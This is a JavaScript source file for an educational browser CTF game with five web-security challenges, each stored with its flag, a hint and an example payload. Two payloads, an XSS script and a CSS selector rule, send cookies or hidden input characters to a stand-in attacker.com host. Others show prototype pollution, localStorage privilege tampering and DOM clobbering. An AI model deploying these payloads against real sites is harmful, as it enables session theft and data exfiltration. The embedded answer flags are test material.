// ===== WEB BASICS CTF DATA (5 FLAGS ONLY) =====
const webChallenges = [
    {
        id: 1,
        title: "HTML Injection",
        description: "Inject malicious HTML into a form field to execute JavaScript and steal admin cookies.",
        points: 200,
        flag: "FLAG{HTML_1nj3ct10n_B4s1c5}",
        hint: "Look for unsanitized input fields. Try <script>alert()</script> or <img src=x onerror=alert()>",
        command: "<script>document.location='https://attacker.com/?c='+document.cookie</script>",
        completed: false,
        hintVisible: false
    },
    {
        id: 2,
        title: "CSS Injection",
        description: "Use CSS attribute selectors to exfiltrate hidden input values character by character.",
        points: 250,
        flag: "FLAG{CSS_Exf1ltr4t10n}",
        hint: "CSS can make requests when loading backgrounds. Use input[value^='a'] selectors.",
        command: "input[value^='F'] { background: url('https://attacker.com/?char=F'); }",
        completed: false,
        hintVisible: false
    },
    {
        id: 3,
        title: "JavaScript Prototype Pollution",
        description: "Pollute Object.prototype to make all objects inherit malicious properties.",
        points: 300,
        flag: "FLAG{Prot0typ3_P0llut10n_JS}",
        hint: "Look for JSON.parse() or Object.assign() without proper validation of __proto__.",
        command: '{"__proto__": {"isAdmin": true, "toString": "hacked"}}',
        completed: false,
        hintVisible: false
    },
    {
        id: 4,
        title: "Local Storage Tampering",
        description: "Modify browser local storage to escalate privileges to admin access.",
        points: 350,
        flag: "FLAG{L0c4l_St0r4g3_T4mp3r}",
        hint: "Check localStorage in DevTools. Look for userRole, isAdmin, or auth tokens.",
        command: "localStorage.setItem('userRole', 'admin'); localStorage.setItem('isAuthenticated', 'true')",
        completed: false,
        hintVisible: false
    },
    {
        id: 5,
        title: "DOM Clobbering",
        description: "Clobber JavaScript variables using HTML elements with matching IDs/names.",
        points: 400,
        flag: "FLAG{D0M_Cl0bb3r1ng_W3b}",
        hint: "Create form elements whose ID/name matches security variables to overwrite them.",
        command: "<form id='config'><input name='isAdmin' value='true'></form>",
        completed: false,
        hintVisible: false
    }
];

// ===== GLOBAL VARIABLES =====
let currentChallenge = null;
let score = 0;
let solved = 0;
const totalChallenges = webChallenges.length;

// ===== TIMER SYSTEM =====
let currentTimer = null;
let timerInterval = null;
const TIMER_DURATION = 60; // 60 seconds = 1 minute

// ===== DOM ELEMENTS =====
const challengesContainer = document.getElementById('challengesContainer');
const browserConsole = document.getElementById('browserConsole');
const output = document.getElementById('output');
const consoleInput = document.getElementById('consoleInput');
const progressFill = document.getElementById('progressFill');
const solvedCount = document.getElementById('solvedCount');
const pendingCount = document.getElementById('pendingCount');
const scoreElement = document.getElementById('score');
const closeConsoleBtn = document.getElementById('closeConsoleBtn');
const resetBtn = document.getElementById('resetBtn');
const backBtn = document.getElementById('backBtn');

// ===== TIMER FUNCTIONS =====
function startTimer(challengeId) {
    stopTimer(); // Stop any existing timer

    currentTimer = {
        challengeId: challengeId,
        timeLeft: TIMER_DURATION,
        element: null
    };

    // Create timer element if it doesn't exist
    if (!document.getElementById('timerElement')) {
        const timerEl = document.createElement('div');
        timerEl.id = 'timerElement';
        timerEl.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #238636, #2ea043);
            color: white;
            padding: 12px 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 1.2rem;
            font-weight: bold;
            z-index: 9999;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
            display: flex;
            align-items: center;
            gap: 10px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(5px);
        `;
        document.body.appendChild(timerEl);
    }

    // Update timer element
    const timerElement = document.getElementById('timerElement');
    currentTimer.element = timerElement;

    // Start the countdown
    timerInterval = setInterval(() => {
        if (currentTimer) {
            currentTimer.timeLeft--;
            updateTimerDisplay();

            if (currentTimer.timeLeft <= 0) {
                timeUp(challengeId);
            }
        }
    }, 1000);

    updateTimerDisplay();
}

function updateTimerDisplay() {
    if (!currentTimer || !currentTimer.element) return;

    const minutes = Math.floor(currentTimer.timeLeft / 60);
    const seconds = currentTimer.timeLeft % 60;
    const timeStr = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

    currentTimer.element.innerHTML = `
        ⏱️ 
        <div style="text-align: center; min-width: 80px;">
            <div style="font-size: 0.8rem; opacity: 0.8;">TIME LEFT</div>
            <div style="font-size: 1.5rem;">${timeStr}</div>
        </div>
        <div style="width: 2px; height: 30px; background: rgba(255,255,255,0.3);"></div>
        <div style="font-size: 0.8rem; text-align: center;">
            <div style="opacity: 0.8;">CHALLENGE</div>
            <div style="font-size: 1rem;">#${currentTimer.challengeId}</div>
        </div>
    `;

    // Update timer color based on time left
    const percentage = (currentTimer.timeLeft / TIMER_DURATION) * 100;
    if (percentage > 50) {
        currentTimer.element.style.background = 'linear-gradient(135deg, #238636, #2ea043)';
    } else if (percentage > 25) {
        currentTimer.element.style.background = 'linear-gradient(135deg, #d29922, #e3b341)';
    } else {
        currentTimer.element.style.background = 'linear-gradient(135deg, #da3633, #f85149)';
    }

    // Add pulse animation when time is low
    if (currentTimer.timeLeft <= 10) {
        currentTimer.element.style.animation = 'pulse 0.5s infinite alternate';
    } else {
        currentTimer.element.style.animation = 'none';
    }
}

function stopTimer() {
    if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
    }

    const timerElement = document.getElementById('timerElement');
    if (timerElement) {
        timerElement.remove();
    }

    currentTimer = null;
}

function timeUp(challengeId) {
    stopTimer();

    const challenge = webChallenges.find(c => c.id === challengeId);
    if (challenge && !challenge.completed) {
        const timeUpHTML = `
            <div class="output-message error" style="animation: shake 0.5s ease-in-out;">
                <div style="color: #f85149; font-size: 1.3rem; margin-bottom: 0.5rem;">
                    ⏰ TIME'S UP!
                </div>
                <p>Challenge <strong>#${challengeId}: ${challenge.title}</strong> expired!</p>
                <p>You took too long to capture the flag.</p>
                <p style="margin-top: 0.5rem; font-size: 0.9rem; color: #8b949e;">
                    <em>Flag was: ${challenge.flag}</em>
                </p>
                <button onclick="retryChallenge(${challengeId})" 
                        style="margin-top: 0.5rem; 
                               padding: 0.5rem 1rem; 
                               background: #da3633; 
                               color: white; 
                               border: none; 
                               border-radius: 5px; 
                               cursor: pointer;">
                    🔄 Retry Challenge
                </button>
            </div>
        `;

        addOutput(timeUpHTML);
    }
}

function retryChallenge(challengeId) {
    stopTimer();
    openConsole(challengeId);
    startTimer(challengeId);
}

// ===== INITIALIZE =====
document.addEventListener('DOMContentLoaded', function () {
    renderChallenges();
    updateProgress();
    setupConsole();
    setupEventListeners();
    startTypingAnimation();
    initCodeRain();
});

// ===== EVENT LISTENERS =====
function setupEventListeners() {
    closeConsoleBtn.addEventListener('click', closeConsole);
    resetBtn.addEventListener('click', resetChallenges);
    backBtn.addEventListener('click', goToLevel1);
}

function goToLevel1() {
    if (confirm("Go back to Level Selection?")) {
        window.location.href = "Levels.html";
    }
}

// ===== RENDER CHALLENGES =====
function renderChallenges() {
    challengesContainer.innerHTML = '';

    webChallenges.forEach(challenge => {
        const card = document.createElement('div');
        card.className = `challenge-card ${challenge.completed ? 'completed' : ''}`;

        card.innerHTML = `
            <span class="challenge-number">${challenge.id}</span>
            <h3 class="challenge-title">${challenge.title}</h3>
            <span class="challenge-points">${challenge.points} pts</span>
            <p class="challenge-desc">${challenge.description}</p>
            <button class="hint-btn" data-challenge-id="${challenge.id}">
                💡 Show Hint
            </button>
            ${challenge.completed ?
                `<div style="color: var(--success); margin-top: 15px; padding: 10px; background: rgba(35, 134, 54, 0.1); border-radius: 10px; border-left: 4px solid var(--success);">
                    ✅ Challenge Solved: ${challenge.flag}
                </div>` :
                ''
            }
            ${challenge.hintVisible ?
                `<div class="challenge-hint" id="hint${challenge.id}">
                    <strong>🔍 Hint:</strong> ${challenge.hint}
                </div>` :
                ''
            }
        `;

        card.addEventListener('click', (e) => {
            if (!e.target.classList.contains('hint-btn')) {
                openConsole(challenge.id);
            }
        });

        const hintBtn = card.querySelector('.hint-btn');
        hintBtn.addEventListener('click', function (e) {
            e.stopPropagation();
            toggleHint(challenge.id);
        });

        challengesContainer.appendChild(card);
    });
}

function toggleHint(challengeId) {
    const challenge = webChallenges.find(c => c.id === challengeId);
    challenge.hintVisible = !challenge.hintVisible;
    renderChallenges();
}

// ===== CONSOLE FUNCTIONS =====
function setupConsole() {
    consoleInput.addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
            processCommand(this.value.trim());
            this.value = '';
        }
    });
}

function openConsole(challengeId) {
    currentChallenge = webChallenges.find(c => c.id === challengeId);
    browserConsole.style.display = 'flex';

    const status = currentChallenge.completed ? '✅ SOLVED' : '🔍 INVESTIGATING';
    const color = currentChallenge.completed ? 'var(--success)' : 'var(--accent)';

    output.innerHTML = `
        <div class="console-info">
            <div style="color: ${color}; font-weight: bold; margin-bottom: 1rem;">
                ╔══════════════════════════════════════════════════════╗<br>
                ║  CHALLENGE: ${currentChallenge.title.padEnd(35)}     ║<br>
                ║  STATUS: ${status.padEnd(39)}                        ║<br>
                ║  POINTS: ${currentChallenge.points.toString().padEnd(39)} ║<br>
                ║  DIFFICULTY: ${getDifficulty(currentChallenge.points)}    ║<br>
                ╚══════════════════════════════════════════════════════╝<br>
            </div>
        </div>
    `;

    if (!currentChallenge.completed) {
        output.innerHTML += `
            <div class="instruction-box">
                <p>🌐 <strong>Web Security Challenge:</strong></p>
                <p>${currentChallenge.description}</p>
                <p>💻 <strong>Available Commands:</strong></p>
                <p>• Type <code>hint</code> - Get web security hint</p>
                <p>• Type <code>code</code> - View exploitation code</p>
                <p>• Type <code>submit FLAG_HERE</code> - Submit flag</p>
                <p>• Type <code>help</code> - Show all commands</p>
                <p>• Type <code>status</code> - Show challenge progress</p>
            </div>
        `;

        // START TIMER FOR NEW CHALLENGE
        startTimer(challengeId);
    } else {
        output.innerHTML += `
            <div class="completed-message">
                <p>✅ <strong>Challenge Solved!</strong></p>
                <p>Flag Captured: <code style="font-size: 1.3rem;">${currentChallenge.flag}</code></p>
                <p>This web security vulnerability has been patched.</p>
            </div>
        `;

        // STOP TIMER IF ALREADY SOLVED
        stopTimer();
    }

    consoleInput.focus();
}

function getDifficulty(points) {
    if (points <= 250) return "🟢 EASY".padEnd(33);
    if (points <= 400) return "🟡 MEDIUM".padEnd(32);
    if (points <= 550) return "🟠 HARD".padEnd(34);
    return "🔴 EXPERT".padEnd(33);
}

function closeConsole() {
    browserConsole.style.display = 'none';
    stopTimer(); // STOP TIMER WHEN CLOSING CONSOLE
    currentChallenge = null;
}

function processCommand(cmd) {
    if (!currentChallenge) {
        addOutput("❌ No challenge selected. Click on a challenge first.", "error");
        return;
    }

    cmd = cmd.toLowerCase();

    if (cmd === 'help') {
        showHelp();
    }
    else if (cmd === 'hint') {
        showHint();
    }
    else if (cmd === 'code') {
        showCode();
    }
    else if (cmd === 'clear') {
        output.innerHTML = '';
    }
    else if (cmd === 'status') {
        showStatus();
    }
    else if (cmd.startsWith('submit ')) {
        submitFlag(cmd.substring(7));
    }
    else {
        addOutput(`❌ Unknown command: "${cmd}". Type 'help' for available commands.`, "error");
    }
}

function showHelp() {
    const helpText = `
        <div class="help-box">
            <p><strong>🛡️ WEB SECURITY COMMANDS:</strong></p>
            <p><code>help</code> - Show this help message</p>
            <p><code>hint</code> - Get web security hint for current challenge</p>
            <p><code>code</code> - View exploitation code/payload</p>
            <p><code>submit FLAG</code> - Submit captured flag (e.g., submit FLAG{example})</p>
            <p><code>status</code> - Show challenge progress and stats</p>
            <p><code>clear</code> - Clear console output</p>
        </div>
    `;
    addOutput(helpText);
}

function showHint() {
    if (currentChallenge.completed) {
        addOutput("✅ Challenge already solved! No hint needed.", "success");
        return;
    }

    const hintHTML = `
        <div class="hint-box">
            <div class="hint-title">🔍 WEB SECURITY HINT: ${currentChallenge.title}</div>
            <div class="hint-content">${currentChallenge.hint}</div>
            <div style="margin-top: 1rem; font-size: 0.9rem; color: var(--text-secondary);">
                <em>Use this clue to exploit the web vulnerability</em>
            </div>
        </div>
    `;
    addOutput(hintHTML);
}

function showCode() {
    if (currentChallenge.completed) {
        addOutput("✅ Challenge already solved!", "success");
        return;
    }

    const codeHTML = `
        <div class="code-box">
            <div style="color: var(--accent); margin-bottom: 0.5rem; font-size: 1.1rem;">
                💻 EXPLOITATION CODE:
            </div>
            <div style="background: rgba(10, 13, 20, 0.9); padding: 1.2rem; border-radius: 10px; border-left: 4px solid var(--accent); font-family: 'Fira Code', monospace; font-size: 0.95rem; line-height: 1.5; overflow-x: auto;">
                ${currentChallenge.command}
            </div>
            <div style="margin-top: 0.8rem; font-size: 0.9rem; color: var(--text-secondary);">
                <em>This is the payload/exploit code for the web vulnerability</em>
            </div>
        </div>
    `;
    addOutput(codeHTML);
}

function showStatus() {
    const statusHTML = `
        <div class="status-box">
            <p>📊 <strong>CHALLENGE STATUS:</strong></p>
            <p>• Challenges Solved: ${solved}/${totalChallenges}</p>
            <p>• Total Score: ${score} points</p>
            <p>• Progress: ${Math.round((solved / totalChallenges) * 100)}%</p>
            <p>• Next Challenge: ${getNextChallengePoints()} points</p>
            <p>• Average Difficulty: ${getAverageDifficulty()}</p>
            <p>• Web Security Level: ${getSecurityLevel()}</p>
            <p>• Current Timer: ${currentTimer ? `${Math.floor(currentTimer.timeLeft / 60)}:${(currentTimer.timeLeft % 60).toString().padStart(2, '0')}` : 'Not running'}</p>
        </div>
    `;
    addOutput(statusHTML);
}

function getAverageDifficulty() {
    const remaining = webChallenges.filter(c => !c.completed);
    if (remaining.length === 0) return "All Mastered 🏆";

    const avgPoints = remaining.reduce((sum, c) => sum + c.points, 0) / remaining.length;
    if (avgPoints <= 250) return "🟢 Beginner";
    if (avgPoints <= 400) return "🟡 Intermediate";
    if (avgPoints <= 550) return "🟠 Advanced";
    return "🔴 Expert";
}

function getSecurityLevel() {
    const percent = (solved / totalChallenges) * 100;
    if (percent >= 90) return "🔐 Elite Hacker";
    if (percent >= 70) return "🛡️ Security Expert";
    if (percent >= 50) return "👨‍💻 Web Developer";
    if (percent >= 30) return "🎓 Security Student";
    return "👶 Beginner";
}

function submitFlag(submittedFlag) {
    if (currentChallenge.completed) {
        addOutput("⚠️ This flag has already been submitted!", "warning");
        return;
    }

    if (submittedFlag === currentChallenge.flag) {
        currentChallenge.completed = true;
        score += currentChallenge.points;
        solved++;

        updateProgress();
        renderChallenges();
        stopTimer(); // STOP TIMER ON SUCCESS

        const successHTML = `
            <div class="success-box">
                <div style="color: var(--success); font-size: 1.6rem; margin-bottom: 1.5rem; text-shadow: 0 0 10px var(--success);">
                    🎉 WEB VULNERABILITY EXPLOITED!
                </div>
                <div style="background: rgba(35, 134, 54, 0.1); padding: 1.8rem; border-radius: 15px; border: 2px solid var(--success); backdrop-filter: blur(10px);">
                    <p><strong>Vulnerability:</strong> ${currentChallenge.title}</p>
                    <p><strong>Points Earned:</strong> +${currentChallenge.points}</p>
                    <p><strong>Flag Captured:</strong></p>
                    <div style="font-family: 'Fira Code', monospace; font-size: 1.4rem; color: var(--success); margin: 1.5rem 0; padding: 1.2rem; background: rgba(0,0,0,0.3); border-radius: 10px; text-shadow: 0 0 15px var(--success);">
                        ${currentChallenge.flag}
                    </div>
                    <p><em>Vulnerability has been reported and patched!</em></p>
                </div>
            </div>
        `;
        addOutput(successHTML);

        celebrateSuccess();

        if (solved === totalChallenges) {
            setTimeout(() => {
                showCompletionMessage();
            }, 1500);
        }
    } else {
        addOutput("❌ Incorrect flag! Re-examine the web vulnerability.", "error");
    }
}

function addOutput(message, type = "normal") {
    const messageDiv = document.createElement('div');
    messageDiv.className = `output-message ${type}`;
    messageDiv.innerHTML = message;

    output.appendChild(messageDiv);
    scrollConsoleToBottom();
}

function scrollConsoleToBottom() {
    const consoleBody = document.querySelector('.console-body');
    if (consoleBody) {
        consoleBody.scrollTop = consoleBody.scrollHeight;
    }
}

// ===== PROGRESS FUNCTIONS =====
function updateProgress() {
    solvedCount.textContent = solved;
    pendingCount.textContent = totalChallenges - solved;
    scoreElement.textContent = score;
    progressFill.style.width = `${(solved / totalChallenges) * 100}%`;
}

function getNextChallengePoints() {
    const nextChallenge = webChallenges.find(c => !c.completed);
    return nextChallenge ? nextChallenge.points : 0;
}

function resetChallenges() {
    if (confirm("⚠️ Are you sure you want to reset all web challenges? All progress will be lost!")) {
        webChallenges.forEach(c => {
            c.completed = false;
            c.hintVisible = false;
        });
        currentChallenge = null;
        score = 0;
        solved = 0;
        renderChallenges();
        updateProgress();
        stopTimer(); // STOP TIMER ON RESET
        output.innerHTML = "✅ All web challenges reset successfully!<br><br>";
        closeConsole();
    }
}

// ===== CODE RAIN EFFECT (simplified) =====
function initCodeRain() {
    // Simple code rain effect
    for (let i = 0; i < 30; i++) {
        setTimeout(() => {
            const char = document.createElement('div');
            char.textContent = Math.random() > 0.5 ? '0' : '1';
            char.style.cssText = `
                position: fixed;
                left: ${Math.random() * 100}vw;
                top: -20px;
                color: rgba(88, 166, 255, ${Math.random() * 0.5 + 0.3});
                font-family: 'Courier New', monospace;
                font-size: ${Math.random() * 10 + 14}px;
                z-index: -1;
                pointer-events: none;
                animation: fall ${2 + Math.random() * 3}s linear forwards;
            `;
            document.body.appendChild(char);

            setTimeout(() => char.remove(), 5000);
        }, i * 100);
    }

    // Add animation style
    if (!document.getElementById('rainStyles')) {
        const style = document.createElement('style');
        style.id = 'rainStyles';
        style.textContent = `
            @keyframes fall {
                to { transform: translateY(100vh); opacity: 0; }
            }
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                25% { transform: translateX(-5px); }
                75% { transform: translateX(5px); }
            }
            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.7; }
            }
        `;
        document.head.appendChild(style);
    }
}

// ===== EFFECTS & ANIMATIONS =====
function startTypingAnimation() {
    const welcomeText = "Type 'help' for web security commands...";
    let i = 0;

    function typeWriter() {
        if (i < welcomeText.length) {
            consoleInput.placeholder = welcomeText.substring(0, i + 1);
            i++;
            setTimeout(typeWriter, 50);
        }
    }

    setTimeout(typeWriter, 1000);
}

function celebrateSuccess() {
    for (let i = 0; i < 20; i++) {
        setTimeout(() => {
            const confetti = document.createElement('div');
            confetti.style.cssText = `
                position: fixed;
                width: 10px;
                height: 10px;
                background: ${Math.random() > 0.5 ? '#58a6ff' : '#238636'};
                border-radius: 50%;
                left: ${Math.random() * 100}vw;
                top: -20px;
                z-index: 9999;
                box-shadow: 0 0 10px currentColor;
                animation: confettiFall ${1 + Math.random()}s linear forwards;
            `;
            document.body.appendChild(confetti);
            setTimeout(() => confetti.remove(), 2000);
        }, i * 50);
    }

    // Add confetti animation
    if (!document.getElementById('confettiStyles')) {
        const style = document.createElement('style');
        style.id = 'confettiStyles';
        style.textContent = `
            @keyframes confettiFall {
                to { transform: translateY(100vh) rotate(360deg); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    }
}

function showCompletionMessage() {
    // Record completion in levelManager
    if (window.levelManager) {
        levelManager.completeQuiz('webbasics', 100);
    }

    const completionHTML = `
        <div style="text-align: center; padding: 2rem; background: rgba(88, 166, 255, 0.1); border-radius: 15px; margin: 1rem 0;">
            <div style="font-size: 2rem; margin-bottom: 1rem;">🏆</div>
            <div style="font-size: 1.8rem; color: var(--accent); margin-bottom: 1rem;">
                ALL 5 CHALLENGES COMPLETED!
            </div>
            <div style="font-size: 1.2rem; margin-bottom: 1rem;">
                Total Score: <span style="color: var(--success);">${score}</span> points
            </div>
            <div style="font-size: 1rem; color: var(--text-secondary);">
                🎯 Perfect Web Security Score Achieved!
            </div>
        </div>
    `;
    addOutput(completionHTML);
}